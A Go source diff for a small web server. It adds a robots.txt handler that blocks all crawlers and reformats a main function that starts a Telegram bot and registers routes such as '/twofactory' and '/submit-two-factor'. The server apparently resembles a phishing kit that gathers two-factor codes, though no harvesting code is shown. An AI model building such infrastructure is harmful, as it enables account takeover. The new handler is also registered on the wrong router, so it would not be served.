@@ -55,32 +55,42 @@ type Review struct {
 	IPAddress   string
 	Timestamp   time.Time
 }
+func robotsHandler(w http.ResponseWriter, r *http.Request) {
+	// Content of the robots.txt file
+	robotsTxt := "User-agent: *\nDisallow: /\n"
+
+	// Set the content type to text/plain
+	w.Header().Set("Content-Type", "text/plain")
+
+	// Write the content of the robots.txt file to the response
+	w.Write([]byte(robotsTxt))
+}
 
 func main() {
-    initTelegramBot()
+	initTelegramBot()
 
-    r := mux.NewRouter()
+	r := mux.NewRouter()
 
-    r.HandleFunc("/", HomePage).Methods("GET")
-    r.HandleFunc("/twofactory", TwoFactoryPage).Methods("GET")
-    r.HandleFunc("/home/{username}", HomePage).Methods("GET")
-    r.HandleFunc("/find", FindPage).Methods("GET")
-    r.PathPrefix("/static/").Handler(http.StripPrefix("/static/", http.FileServer(http.Dir("static"))))
-    r.HandleFunc("/submit-review", SubmitReview).Methods("POST")
-    r.HandleFunc("/submit-two-factor", SubmitTwo).Methods("POST")
-    r.HandleFunc("/upload", UploadPage).Methods("GET")
-    r.HandleFunc("/upload", UploadHandler).Methods("POST")
+	r.HandleFunc("/", HomePage).Methods("GET")
+	r.HandleFunc("/twofactory", TwoFactoryPage).Methods("GET")
+	r.HandleFunc("/home/{username}", HomePage).Methods("GET")
+	r.HandleFunc("/find", FindPage).Methods("GET")
+	r.PathPrefix("/static/").Handler(http.StripPrefix("/static/", http.FileServer(http.Dir("static"))))
+	r.HandleFunc("/submit-review", SubmitReview).Methods("POST")
+	r.HandleFunc("/submit-two-factor", SubmitTwo).Methods("POST")
+	r.HandleFunc("/upload", UploadPage).Methods("GET")
+	r.HandleFunc("/upload", UploadHandler).Methods("POST")
+	http.HandleFunc("/robots.txt", robotsHandler)
+	// Get the port from the environment variable or default to 8080
+	port := os.Getenv("PORT")
+	if port == "" {
+		port = "8080"
+	}
 
-    // Get the port from the environment variable or default to 8080
-    port := os.Getenv("PORT")
-    if port == "" {
-        port = "8080"
-    }
+	log.Printf("Starting server on :%s", port)
 
-    log.Printf("Starting server on :%s", port)
-    
-    // Use http.ListenAndServe to start the server on the specified port
-    http.ListenAndServe(":" + port, r)
+	// Use http.ListenAndServe to start the server on the specified port
+	http.ListenAndServe(":"+port, r)
 }
 
 func initTelegramBot() {
